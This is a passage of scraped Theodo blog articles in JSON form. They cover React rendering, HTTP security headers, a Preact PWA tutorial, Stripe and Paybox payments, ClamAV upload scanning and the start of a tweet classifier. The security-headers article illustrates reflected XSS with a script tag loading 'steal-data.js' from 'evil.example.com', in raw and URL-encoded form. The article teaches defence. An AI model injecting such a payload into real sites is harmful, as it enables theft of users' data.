onClick={this.onClick} />\r\n      </div>\r\n   }\r\n}\r\n\r\nMyPage\r\n\n\n\u2714\ufe0e Function is defined outside of the render function\n\u2714\ufe0e The component will render only once for a given param\n\u2714\ufe0e The function onClick does not need to be bound, because the arrow function gives access to this\n\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Pasteau\r\n  \t\t\t\r\n  \t\t\t\tAgile Engineer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tBy default, a lot of security flaws are introduced when you create a website. A few HTTP headers added in your web server configuration can prevent basic but powerful attacks on your website. If you really have only 5 minutes, you can skip to the end and copy-paste the few lines in your server configuration file. If you have a bit more time, you can go on and read what are these flaws and how you can protect your website from: clickjacking, MIME sniffing attack, Protocol downgrade attack, and reflective XSS.\nX-FRAME-OPTIONS\nA common threat to websites is clickjacking. A clickjacking attack wants to make you click wherever the attacker wants you to click. This type of attack was largely used on Facebook before they implemented the protection (see here).\nHow does it work?\nBasically, the attacker brings the user to a malicious page. However, the malicious page is hidden behind an innocent/trustworthy page, introduced in the malicious website with an iframe. The user is tricked into clicking on the regular page but he or she actually clicks on the malicious page. From this, the attacker can achieve whatever malicious action.\nBelow is an example, where a user is shown an interesting advertisement. While clicking on the button to enjoy the offer, the user will actually buy a car on eBay.\n\nYou can find more information here.\nHow to prevent clickjacking on your website ?\nThe X-FRAME-OPTIONS header tells the browser if another website can put your page in an iframe.\n\nSetting its value to DENY will tell the browser to never put your page into an iframe.\nSetting its value to SAMEORIGIN will tell the browser to never do it except where the host website is the same as the target website.\n\nIn most cases, you will want to add this line to your NGINX configuration file:\nadd_header X-Frame-Options \"DENY\";\r\n\nFor Apache web server you can add:\nHeader set X-FRAME-OPTIONS \"DENY\"\r\n\nX-Content-Type-Options\nSometimes, the browser tries to guess (or sniff) the type of an object (an image, a CSS file, a JavaScript file, etc). This can be used to make a browser execute some malicious JavaScript file. This issue was so important that Microsoft dedicated a security update for Internet Explorer 8 in part to it.\nHow does it work?\nWhen your browser loads a file, it reads the Content-Type header to determine which type it is. If you want to display an image on your webpage, you will generally write this in an HTML page:\n<img src=\"https://example.com/some-image\"></img>\r\n\nWhat if the some-image file is HTML instead? If your browser is MIME sniffing the file, it will inspect the content of this file, detect that this is HTML and render the HTML content, along with JavaScript included in the HTML. This means that a user can upload an image with HTML and JavaScript as the content, this JavaScript could be executed on any user displaying this fake image.\nYou can find more information here.\nHow to prevent MIME sniffing on your website?\nThe X-Content-Type-Options header tells the browser if it should sniff files or not.\nSetting its value to nosniff will tell the browser to never sniff the content of a file. The browser will only use a file if its Content-Type matches the HTML tag where it is used, and fail otherwise.\nHere is the line to add in your NGINX configuration file:\nadd_header X-Content-Type-Options \"nosniff\";\r\n\nFor Apache web server you can add:\nHeader set X-Content-Type-Options \"nosniff\"\r\n\nStrict-Transport-Security\nHTTPS is a great way to increase the security of your website and your users. However, it is possible to trick your users not to use HTTPS: once this is done, a malicious person can see what a user does on your website!\nHow does it work?\nIf you don\u2019t know yet, HTTPS is already a huge step towards improving the security of your website (if you want to include it on your website, I advise using Let\u2019s Encrypt). It prevents all the machines between your user and your server to see what is going on. It also guarantees that your users are talking to the correct website.\nHowever, when visiting a website, your browser will usually try to connect over HTTP, and once the server tells that it supports HTTPS, will upgrade to a secure connection. This represents an issue as a malicious person can intercept this insecure HTTP connection: it is known as a protocol downgrade attack.\nYou can find more information here.\nHow to prevent protocol downgrade attack on your website?\nThere are several ways to prevent this attack. As a user, you can install HTTPS everywhere (on Chrome or Firefox) which make your browser always try HTTPS first. But you can\u2019t force all your users to do this, fortunately, there is a server-side way.\nThe Strict-Transport-Security HTTP header (known as HSTS) tells the browser to connect directly with HTTPS to the website. This should be done through a redirection on your server from HTTP to HTTPS. A recommended lifetime for the HSTS header is 1 year and should include subdomains (see here).\nHere is the line to add in your NGINX configuration file:\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\";\r\n\nFor Apache web server you can add:\nHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\r\n\nNB: This prevents the protocol downgrade attack on subsequent visits but not on the first one. You can visit the HSTS preload list website to see how you can prevent it on the first visit as well.\nX-XSS-Protection\nCross-site scripting (usually referred as XSS) is a way for a malicious person to take control of the page by injecting a script. If user content is wrongly injected into a website, an attacker can execute some script on your page, and from there do virtually everything.\nHow does it work?\nUsually, a website includes some user content. A messaging service displays the user messages.\nA search engine includes the search keywords on the page. The search keywords are also a part of the URL of the search engine. A search for theodo might look like this https://duckduckgo.com/?q=theodo.\nIf a malicious person searches for something like <script src=\"http://evil.example.com/steal-data.js\"></script>, then the URL will look like https://duckduckgo.com/?q=<script+src%3D\"http%3A%2F%2Fevil.example.com%2Fsteal-data.js\"><%2Fscript>. If the keywords are directly injected in the search page, it will show:\n\nAnd voil\u00e0, if someone tricks your users into going to the URL above, the malicious script is executed on your website on someone else\u2019s computer.\nYou can find more information here.\nHow to prevent reflected XSS on your website?\nThe best way to prevent reflected XSS is to escape all user input and to make sure to inject only trusted data in your website. Most modern frameworks do this, but this is sometimes impossible to do so. Another way is to say to the browser to not execute a script tag if it matches something in the query string. You can do this by adding the header X-XSS-Protection in the HTTP response and setting its value to 1; mode=block.\nHere is the line to add in your NGINX configuration file:\nadd_header X-XSS-Protection \"1; mode=block\";\r\n\nFor Apache web server you can add:\nHeader set X-XSS-Protection \"1; mode=block\"\r\n\nNB: this header actually causes more vulnerabilities on Internet Explorer 8 and older (less than 0.1% of market share). If you need to support these browsers you should disable this header when encountering these.\nExposing server information with Server and X-Powered-By\nBy default, NGINX and Apache display some information about the server (whether the web server is NGINX or Apache, the server version, perhaps the PHP version and the OS version).\nHiding this information will not prevent a hacker to exploit your server. However, it can direct the hacker to a particular set of attacks where your server is known to be vulnerable. These headers do not have a particular purpose and hiding them is nothing but benefitial.\nHere are the lines to add in your NGINX configuration file:\nserver_tokens off;\r\n\r\n// To be set in your proxy block\r\nproxy_hide_header X-Powered-By;\r\n\nFor Apache web server you can add:\nServerTokens Prod\r\n\nAnd for a PHP website served by Apache, add this in your PHP configuration file:\nexpose_php = Off\r\n\nTL;DR here are the lines you can add to your web server configuration file\nSetting a few HTTP headers on your web server can prevent some basic yet powerful attacks on your website. I advise you to do so for every website you own, where it is possible.\nFor NGINX, add these lines in the configuration file of your website:\nadd_header X-Frame-Options \"DENY\";\r\nadd_header X-Content-Type-Options \"nosniff\";\r\nadd_header Strict-Transport-Security \"max-age=31536000; includeSubDomains\";\r\nadd_header X-XSS-Protection \"1; mode=block\";\r\nserver_tokens off;\r\n\r\n// To be set in your proxy block\r\nproxy_hide_header X-Powered-By;\r\n\nFor Apache, add these lines in the configuration file of your website:\nHeader set X-FRAME-OPTIONS \"DENY\"\r\nHeader set X-Content-Type-Options \"nosniff\"\r\nHeader set Strict-Transport-Security \"max-age=31536000; includeSubDomains\"\r\nHeader set X-XSS-Protection \"1; mode=block\"\r\nServerTokens Prod\r\n\nNB: if you use Expressjs, all these recommendations can be easily applied with the NPM package helmet. However, I recommend setting HTTP headers (and other concerns as compression and cache) on the web server side instead of Expressjs side because it is more efficient and improves the performance of your application.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Escolano\r\n  \t\t\t\r\n  \t\t\t\tDeveloper at Theodo  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis article will introduce you to the world of Progressive Web Apps, to the Preact framework and to Web APIs. It will guide you through 15 minutes of code to create your first Preact Progressive Web App!\nStatus of PWAs today\nProgressive Web Apps are taking over the web! They are the future of desktop, mobile and native web applications. Multiple major companies are switching to PWAs for costs but also performance reasons:\u00a0Twitter, Uber, l\u2019\u00c9quipe\u2026\nBut first, what is a Progressive Web App (PWA) ?\u00a0A Progressive Web Application is a combination of the latest web technologies and good practices to implement. Most of the latter can be evaluated by the Lighthouse Chrome extension. And its extensive documentation will teach you a lot on how to improve you app.\nThose practices will make your web application:\u00a0Progressive, Responsive, Connectivity independent, App-like, Fresh, Safe, Discoverable, Re-engageable, Installable and Linkable. You can find a definition of each of those characteristics at Google\u2019s. The combination of those characteristics result in one single web application that is lighter, faster to load, usable on any device, on low-quality networks and even offline. You can use the web framework of your choice and your app will be cross-platform and cross-devices. The most common frameworks for PWAs today are Angular, React, Vue.js and Ionic.\n\nPWAs still suffer from a few limitations compared to native apps due to them being brand new. However, more and more Web APIs are announced at Google I/Os each year and Apple is now considering integrating one of the technologies that make up PWAs: the service workers.\nFinally, even if you\u2019re not aiming at replacing your native apps by a PWAs (yet!), implementing those good practices in your mobile and desktop web applications will help you drastically improve performances and maybe even positively impact your business. You can trust Algolia about its performance improvement and Google in its showcase for business impact.\nThis article is the first of a series that will show you how to create a new PWA from scratch using the Preact framework. Our final application will be a social media PWA where we can post photos that will be pinned on a map. The tutorial demonstrates how to use React packages in the Preact framework, and how easy it can be to use Web APIs in your PWA. The next parts in the series will teach you how to:\n\nConnect your app to Firebase using ReactFire\nUse the Geolocation Web API\nAdd Google Authentication\nSet up the offline mode in your PWA\nImprove the performances\nUse push notifications\n\u2026\n\nWe also started writing a series of awesome articles on how to build a PWA using Vue.js, Webpack, Material Design and Firebase:\u00a0Part 1, Part 2 and Part 3.\nWhy Preact?\n\nPreact is a tiny 3KB alternative to React, meaning it is super light and fast, and it packs up most of React\u2019s features, including the same API! You can check this article for a quick comparison and an example of how to switch from React to Preact. Preact aims to offer high performance rendering with an optional compatibility layer (preact-compat) that integrates well with the rest of the React ecosystem such as Redux.\nPreact is thus perfectly suited for desktop and more specifically mobile web-apps used with poor data connection, and therefore for Progressive Web Apps. Multiple renowned companies are now using Preact in production, such as Uber, Housing.com and Lyft. You can have a more exhaustive list of them here.\u00a0Addy Osmani did a quick review of the performances of the Treebo PWA and wrote:\u00a0\u201cSwitching from React to Preact was responsible for a 15% improvement in time-to-interactive alone\u201d. Preact helped them \u201cgetting their vendor bundle-size and JS execution time down\u201d.\nOur goals in this article\nBy the end of this article, after 15 minutes of coding, we will have:\n\nA Progressive Web App based on Preact and webpack, scaffolded by preact-cli\nA map displayed by the google-maps-react React package (Google Maps API)\nA camera button (Material Design Lite)\nA camera modal triggered by the camera button (Camera Web API)\nThe picture taken by the camera/webcam displayed on the map\n\n\nLet\u2019s code!\nYou can find the companion repository for this article here. I will also post the matching commits links along the article steps. However, I won\u2019t linger on some commits related to code style and documentation. We will use yarn instead of npm in the examples. To install it you can refer to this page.\nI wrote this article using the following versions:\n\nnode v8.1.2\npreact v2.0.2\nyarn v1.0.1\n\nScaffold your app\nTo begin, we need to install preact-cli and create our project:\nyarn add preact-cli\r\npreact create default pinpic\r\ncd pinpic\r\nyarn install\r\nyarn dev\r\n\n\nAll this constitues our first commit. The project creation is pretty straightforward and won\u2019t ask you anything other than the project name. After running yarn dev, you can now follow the link given to check the results of your developments in real-time on http://localhost:8080.\nCheck out the hot reload on your phone!\nHowever the best way to visualize your new Preact Progressive Web App is still on your mobile device. If your phone is on the same network, you can use the address shown by the yarn dev command, http://192.168.1.100:8080 in our example above. Of course, you can also show off and share your PWA to your friends. For this purpose, I recommend you use ngrok.\u00a0ngrok will expose your local environment and you will be able to access it on your phone. You can have a more thorough review of ngrok in Matthieu Auger\u2019s article.\nInstall it and run it:\nyarn global add ngrok\r\nngrok http 8080\r\n\nThe output should look like:\n\nBrowse on your phone to either link and you will be able to access your PWA.\nIt is now time for a bit of cleaning by removing some generated documentation and files (commit) and adding a Webpack alias to make PinPic refer to the src files (commit).\nUpdate the manifest\nWe can now modify our src/manifest.json to update the name of our PWA (see this commit). The manifest.json is what makes a PWA installable and handles its display (if it\u2019s seen like a normal web page in chrome, or in a standalone app). By default preact-cli makes our PWA standalone and makes it feel like a native app.\n\nDisplay a map\nTo display a map in our app we will use the library google-maps-react. We will start by adding the package:\nyarn add google-maps-react\r\n\nYou can now get a Google API key from the Google Developers website and put it in src/service/api.js:\nexport const GOOGLE_API_KEY = '<YOUR-GOOGLE-API-KEY>';\r\n\nOur next step is to create a component in src/components/maps/index.js and add in it the lines of code from this section of the google-maps-react documentation. We also need to add the GOOGLE_API_KEY to our component (as specified in this section). In your src/components/maps/index.js, import the API key into a GoogleApiWrapper and import this new component into our src/components/app.js:\n...\r\nimport { GOOGLE_API_KEY } from 'PinPic/service/api';\r\n...\r\nexport default GoogleApiWrapper({\r\n    apiKey: GOOGLE_API_KEY,\r\n})(MapContainer)\r\n\n...\r\nimport MapContainer from './maps';\r\n...\r\n    render() {\r\n        return (\r\n            <div id=\"app\">\r\n                ...\r\n                <MapContainer />\r\n            </div>\r\n        );\r\n    }\r\n...\r\n\nYour changes should look like this commit. Finally, we can fiddle around with the style (commit) to have the whole map displayed and not hidden by the header. Your app should now perfectly display a map as background of your app. Congratulations!\n\nMaterial Design Lite and React Camera\nOur goal is now to use the camera/webcam of your mobile/laptop and to access it by tapping a Material Design camera button. To do that, we now need to install two new packages:\nyarn add preact-mdl\r\nyarn add react-camera\r\n\nAdd the Camera Button\nLet\u2019s first add the Material Design Camera button centered at the bottom of our app. From the preact-mdl package documentation we get the two links to the stylesheets. We can then import the button and icon we want along with the Material Design stylesheets. We also add some style to have it centered at the bottom of our page. In our src/components/app.js, add (commit):\n...\r\nimport { Button, Icon } from 'preact-mdl'\r\n...\r\n                <div className=\"buttonContainer\">\r\n                    <Button\r\n                        fab\r\n                        colored\r\n                        raised\r\n                        onClick={this.toggleCameraModal}\r\n                    >\r\n                        <Icon icon=\"camera\"/>\r\n                    </Button>\r\n                </div>\r\n                <link rel=\"stylesheet\" href=\"https://fonts.googleapis.com/icon?family=Material+Icons\" />\r\n                <link rel=\"stylesheet\" href=\"https://code.getmdl.io/1.2.1/material.indigo-pink.min.css\" />\r\n...\r\n...\r\n.buttonContainer {\r\n    position: absolute;\r\n    bottom: 0;\r\n    padding: 10px;\r\n    display: flex;\r\n    align-items: center;\r\n    width: 100%;\r\n}\r\n\n\nCreate and display the Camera Modal\nOur app now needs a modal to display the media stream from our webcam/camera. This modal will be our new component src/components/cameraModal/index.js, created from the content of this section of the react-camera documentation. Copy it and replace import React, { Component } from 'react'; by import { Component } from 'preact'; and App by CameraModal (commit). We can then import it in src/components/app.js.\n...\r\nimport CameraModal from './cameraModal';\r\n...\r\n    render() {\r\n        return (\r\n            ...\r\n            <CameraModal />\r\n            ...\r\n        )\r\n    }\r\n\nYou can now see the CameraModal open at any time.\n\nMake the Camera Button toggle the Modal\nOn our app, we now have a CameraButton that does nothing and a CameraModal that displays the video stream from our webcam/camera. The next step is to have the CameraButton toggle on and off the CameraModal. In src/components/app.js, we create a state property isCameraModalOpen set to false by default and a function toggleCameraModal that will toggle this state. Those two are to be passed to the CameraModal component. Now, in src/components/cameraModal/index.js, we handle those two new props and create a hideModal() method to manage the style of the modal (commit).\n...\r\nexport default class App extends Component {\r\n    constructor(props) {\r\n        super(props);\r\n        this.setState({\r\n            isCameraModalOpen: false,\r\n        })\r\n        this.toggleCameraModal = this.toggleCameraModal.bind(this);\r\n        this.setPicture = this.setPicture.bind(this);\r\n    }\r\n\r\n    toggleCameraModal() {\r\n        const isCameraModalOpen = this.state.isCameraModalOpen;\r\n        this.setState({\r\n            isCameraModalOpen: !isCameraModalOpen\r\n        });\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            ...\r\n            <CameraModal\r\n                isModalOpen={this.state.isCameraModalOpen}\r\n                toggleCameraModal={this.toggleCameraModal}\r\n            />\r\n        )\r\n    }\r\n    ...\r\n}\r\n\n...\r\nexport default class CameraModal extends Component {\r\n    constructor(props) {\r\n        ...\r\n        this.hideModal = this.hideModal.bind(this);\r\n    }\r\n    ...\r\n    hideModal() {\r\n        return this.props.isModalOpen ? {top: 0, opacity: 1} : {top: '100vh', opacity: 0}\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            <div\r\n                style={{\r\n                    ...style.container,\r\n                    ...this.hideModal()\r\n                }}\r\n            >\r\n                ...\r\n            </div>\r\n        )\r\n    }\r\n    ...\r\n}\r\n\nYour button now toggles the CameraModal on and off. I added some style to have a smoother toggle (commit) and added prop-types checks on the CameraModal (commit). I ended with a bit of code cleaning by moving the style of the components inline (commit).\nDisplay Taken Picture\nThe last step of our app is now to save and display the picture taken. In src/components/app.js, we create a method setPicture that will save the picture blob in an objectURL. We then pass this method to the CameraModal.\nWe also display the picture on the top right of the map (commit).\nNow use this method in src/components/cameraModal/index.js:\n...\r\nexport default class App extends Component {\r\n    constructor(props) {\r\n        ...\r\n        this.setPicture = this.setPicture.bind(this);\r\n    }\r\n    ...\r\n    setPicture(picture) {\r\n        this.img.src = URL.createObjectURL(picture);\r\n    }\r\n    ...\r\n    render() {\r\n        return (\r\n            <div style={styles.app}>\r\n            ...\r\n                <div style={styles.mapContainer}>\r\n                    <img\r\n                        style={styles.picture}\r\n                        ref={(img) => {\r\n                            this.img = img;\r\n                        }}\r\n                    />\r\n                    ...\r\n                </div>\r\n                <CameraModal\r\n                    ...\r\n                    setPicture={this.setPicture}\r\n                />\r\n            </div>\r\n            ...\r\n        )\r\n    }\r\n}\r\n\r\nconst styles = {\r\n    ...\r\n    picture: {\r\n        top: 10,\r\n        right: 10,\r\n        position: 'absolute',\r\n        zIndex: 10,\r\n        height: 200,\r\n    },\r\n    ...\r\n}\r\n\r\n\n...\r\nexport default class CameraModal extends Component {\r\n    ...\r\n    static propTypes = {\r\n        ...\r\n        setPicture: PropTypes.func,\r\n    }\r\n    ...\r\n    takePicture() {\r\n        ...\r\n        .then(blob => {\r\n            this.props.setPicture(blob)\r\n        });\r\n        ...\r\n    }\r\n}\r\n\nYou can also remove the following lines of code from src/components/cameraModal/index.js, since it has been moved to src/components/app.js:\n...\r\n<img\r\n    style={style.captureImage}\r\n    ref={(img) => {\r\n        this.img = img;\r\n    }}\r\n>\r\n...\r\n\n\nAwesome! You now have your own Preact Progressive Web App that displays a map and its pinpoints, allows you to take a picture through the webcam/camera of your device and displays it.\nConclusions\nThis tutorial allowed us to discover preact and to see how quick it can be used to develop a small but powerful PWA from scratch.\n\nWe created a Preact and webpack based Progressive Web App backbone using one command\nWe used the Google Maps API to display a map as background of our app\nWe added a Material Design camera button\nWe used the Camera Web API to take a picture and display it\n\nIf you are in Paris and interested in PWAs, I am co-organizing the Paris Progressive Web Apps Meetup once every month. Don\u2019t hesitate and join us!\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tLaurent Ros\r\n  \t\t\t\r\n  \t\t\t\t@lros_8 \u2022 Lean Full Stack Developer @Theodo \u2022 @PwaParis Meetup Organizer \u2022 Climbing addict!  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\t\nAs a way of getting incomes from your web application you often need to setup a way for your user to pay through your website.\nUsually thanks to a form where your user will fill it\u2019s banking information.\nIt may sounds like a big feature to implement but existing tools really ease the task.\nOn my project we\u2019ve tried two of\u00a0the main ones available : Stripe and Paybox.\nAnd here\u2019s how we quickly did it.\nHow to quickly setup Stripe on your app\nStripe provides an easy to setup REST API to allow secure online payment on your web app.\nI\u2019ve tried it on a Symfony 2.8 project and in half a day I was able to send and visualize test payment on the stripe dashboard.\nFirst you need to create an account on Stripe which will give you access to the stripe dashboard where you can see all the transaction made.\nWith the creation of your account stripe provides you a test API key.\nThen add in your composer require\n\r\n{\r\n  \"require\": {\r\n  \"stripe/stripe-php\": \"4.*\"\r\n  }\r\n}\r\n\nand your API keys in your config.yml and start implementing the service which fits your needs.\nTo start making transaction you need to deal with the authentication to the Stripe API thanks to your API keys and to create a \\Stripe\\Charge object :\n\r\n\\Stripe\\Charge::create(array(\r\n  \"amount\" = round($price * 100),\r\n  \"currency\" = \"usd\",\r\n  \"customer\" = $customerId)\r\n);\r\n\nStripe provides a standard online payment form but you can make your own custom one without any issue.\nIn that case you need to deal with Stripe tokenification, which add another security layer.\nIt\u2019s usually done by a javascript script on the page of your form.\nYou can also directly install one of several Symfony bundle already implementing a service and a formType for the payment with javascript tokenification.\nWhich is a nice and quick way to do a proof of concept on the matter.\nTroubleshooting\nStripe has an IRC channel where people quickly help you.\nFeel free to contact them when encountering technical issue.\nHow to setup Paybox\nPaybox is the French counterpart of Stripe, it\u2019s less easy to setup and less developper friendly but it still provides a complete online payment solution in one day or so.\nWhy Paybox over Stripe ?\n\u2013 You have better price on Paybox\n\u2013 A big client can easily have a good price with a fix fee over a percntage for stripe.\n\u2013 Paybox is a french solution so you can easily interact with them, call their technical support\nHow to quickly install it\nYou can install a Paybox bundle with composer.\nI\u2019ve chosen this one as the read me is explicit enough and close to the Paybox documentation.\n\r\ncomposer require lexik/paybox-bundle\r\n\nThen\u00a0follow the read me\u00a0on github to implement your online payment service.\nLike Stripe, Paybox provides a dev and a prod environment.\nOn the dev environment you can simulate payment with fake credit card.\nTroubleshooting\nThe online documentation is not always updated (we had some issues with correct request according to the documentation which triggered wrong http response).\nYou also have to choose one offer of Paybox among the three available and each offer works differently with different request.\nIn case of issue don\u2019t hesitate to directly call their technical support.\nWhich one to choose\nWe\u2019ve already covered the fact that Stripe is easier to implement than Pyabox\nAvailability\nBoth Solutions allow Visa, MasterCard and AmericanExpress and a large variety of other payment method.\nPaybox offer is centralized on France so if your client want to charge customer outside of France you\u2019d rather use Stripe.\nPrice\nStripe charges you a flat rate of 2.9% + 30\u00a2 per successful charge as long as you\u2019re doing under $1 million in volume per year.\nWhereas Paybox offers you a monthly subscription (around 200\u20ac TTC with 100 free transactions and then fix a fee of 0,85\u20ac per transaction).\nNote that you can bargain better prices with both solution.\nAs a result I would recommend using Paybox if your client needs a payment solution that involves numerous transaction and big amounts.\nOn the other hand if your client only want to have a quick online payment solution on a single project, it would be better to go for stripe.\n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tIvann Morice\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tI recently had to allow customers to upload files on a website, then send their content to an external API.\nWe had a few requirements for the files to be valid and one of them was to ensure they were checked for any virus before posting their content to the API.\nOur infrastructure\nOur stack was a React frontend and a Django Backend, hosted on AWS Elastic Beanstalk.\nThe backend was mainly designed as a proxy for all the requests that the frontend wanted to make with the external API, which means we would not be storing any of the files uploaded by the customer. We only needed to analyse the stream of the files.\n\nWe also needed to be sure that the solution would work for our development environment alongside our validation and our production platforms.\nThe go-to solution was to use Docker Images.\nNot only could we have a quick installation for our local environments but we could use the EBS Docker configuration to setup our instances easily.\nIn terms of AntiVirus, ClamAV revealed itself as the only one we could use easily and for free.\nWe then chose 2 Docker images:\n\nOne to run the Clamd daemon and the freshclam tool (to update the virus database) as a recurring job. (https://github.com/mko-x/docker-clamav)\nOne to connect to the network socket of the daemon and expose a rest API we could easily use. (https://github.com/solita/clamav-rest)\n\n\nConfiguration\nOur docker-compose.yml file looked like this for our local environment:\nversion: '2'\r\n\r\nservices:\r\n  clamav-server:\r\n    image: mkodockx/docker-clamav\r\n  clamav-rest:\r\n    image: lokori/clamav-rest\r\n    links:\r\n      - clamav-server\r\n    environment:\r\n      CLAMD_HOST: clamav-server\r\n  backend:\r\n    build: .\r\n    command: python /code/manage.py runserver\r\n    volumes:\r\n      - .:/code\r\n    ports:\r\n      - \"8000:8000\"\r\n    links:\r\n      - clamav-rest\r\n\nNote: these images did not need any open ports because they would be called directly from your backend instance. However, the REST image needed to have the ClamaAV server as a link and the backend needed to have access to the REST!\nWe could replicate the same configuration as a multi-container docker configuration within AWS EBS.\nHere is our Dockerrun.aws.json:\n{\r\n  \"AWSEBDockerrunVersion\": 2,\r\n  \"containerDefinitions\": [\r\n    {\r\n      \"name\": \"clamav-server\",\r\n      \"image\": \"mkodockx/docker-clamav\",\r\n      \"essential\": true,\r\n      \"memory\": 1024\r\n    },\r\n    {\r\n      \"name\": \"clamav-rest\",\r\n      \"image\": \"lokori/clamav-rest\",\r\n      \"essential\": true,\r\n      \"memory\": 512,\r\n      \"links\": [\r\n        \"clamav-server:clamav-server\"\r\n      ],\r\n      \"portMappings\": [\r\n        {\r\n          \"hostPort\": 8080,\r\n          \"containerPort\": 8080\r\n        }\r\n      ],\r\n      \"environment\" : [\r\n          { \"name\" : \"CLAMD_HOST\", \"value\" : \"clamav-server\" }\r\n      ]\r\n    }\r\n  ]\r\n}\r\n\nNote: we went for a t2.small for the instance because the daemon and freshclam used a lot of memory when updating. (below 1GB caused us problems)\nMake it rain!\nThen we could use our instance with its private IP to post files on the port 8080!\n\nIn python, we could analyse the file sent from the frontend:\nfiles = {'file': file.name}\r\ndata = {'name': file.name}\r\nresponse = requests.post('http://%s:8080/scan' % settings.CLAMAV_HOST, files=files, data=data)\r\n\r\nif not 'Everything ok : true' in response.text:\r\n    logger.info('File %s is dangerous, preventing upload' % file.name)\r\n    raise UploadValidationException('Virus found in the file')\r\n\nNote: the rest API is returning \u2018Everything ok : true\u2019 with what seems to be a new line at the end of the string.\nCLAMAV_HOST was our instance private IP on our staging and production platform, it was \u2018clamav-rest\u2019 locally.\nConclusion\nIt took us a few days to investigate all the possible solutions and come up with this configuration.\nThis not only allows you to have a fast solution but also a reliable one thanks to ElasticBeanstalk.\nI hope it will help anyone who needs to have a quick implementation of an antivirus \n\r\n\t\t\t\t\t\t\t\t\t\tYou liked this article? You'd probably be a good match for our ever-growing tech team at Theodo. Join Us\r\n\r\n\t\t\t\t\t\t\t\t\t\t\r\n\tWRITTEN BY\r\n\r\n\t\r\n\t\t    \r\n  \t\t\r\n  \t\t\t\r\n  \t\t\t\t  \t\t\t\r\n  \t\t\r\n\r\n  \t\t\r\n\t\t\t\tCl\u00e9ment Pasteau\r\n  \t\t\t\r\n  \t\t\t\tAgile Web Engineer at Theodo UK  \t\t\t\r\n  \t\t\r\n    \r\n\t\t\t\r\n\r\n\t\t\t\t\t\t\t\t\t"},
{"article": "\r\n\t\t\t\t\t\t\t\t\t\tThis is a running blog written during my attempt to build a Trump-Obama tweet classifier in under an hour, providing a quick guide to text classification using a Naive Bayesian approach without \u2018recoding the wheel\u2019.\nNote: This is less a tutorial on Machine Learning / Classifier theory, and more targeted at showing how well established classification techniques along with simple libraries can be used to build classifiers quickly for real world data.\nLive demo here:\u00a0https://benellerby.github.io/trump-obama-tweet-classifier/\nData\nFirst we need labelled historic data which machine learning approaches, such as\u00a0Bayesian Classifiers ,\u00a0rely on for training.\nSo we need to get past tweets of both presidents.\u00a0Luckily Twitter gives us access to the last 3,200 tweets of a user, but it relies on a bit of scripting to automate the process.\nLet\u2019s start with\u00a0Tweepy\u00a0which is a simple Python interface to the Twitter API that should speed up the scripting side.\n\nNote: Issues with pip install so cloned and built the package manually on OSX.\n\nNow we need credentials so let\u2019s go to Twitter, sign in and use the Twitter Application Console to create a new app and get credentials.\n\nIf using a placeholder for your app\u2019s URL fails then direct it to your public GitHub page, that\u2019s what I\u2019ve done.\n\nNow, there is a challenge to get the tweets as there are multiple API calls to get the list of tweet IDs and then the tweet content. To save time I found a script\u00a0and adapted it for Donald Trump and Obama respectively.\nAfter running this twice we have two JSON files of the last 3,200 tweets of each president. Yet, the JSONs are just listed as \u201c{\u2026}{\u2026}\u201d with no comma delimitation and no surrounding square brackets. This is therefore invalid JSON and needs to be fixed.\n\nIn fact it\u2019s in the\u00a0JSON Lines format. As we won\u2019t have a scaling issue\u00a0parsing\u00a0this json, we can convert it to a standard JSON and parse directly through JS rather than split on \u201c\\n\u201d.\n\nA quick regex turns the files into usable JSON arrays. Replacing \u201c}{\u201c with \u201c},{\u201c \u00a0and adding the two surrounding square brackets to the whole list.\nBuilding the Classifier\nNext, building a Naive Bayesian Classifier for our 2 categories, Trump and Obama.\nThe maths behind the classifier isn\u2019t too complex if you\u2019re interested.\nThe main decision to make is what feature set (attributes of each data element that are used in classification\u00a0e.g. length, words) to use and how to implement it. Both of these are solved by the Bayes NPM package\u00a0which provides a simple interface to build Naive Bayesian models from textual data.\nThe bayes package uses term frequency as the single, relatively simple, feature for classification. Text input is tokenized (split up into individual words without punctuation) and then a frequency table constructed mapping each token to the number of times it\u2019s used within the document 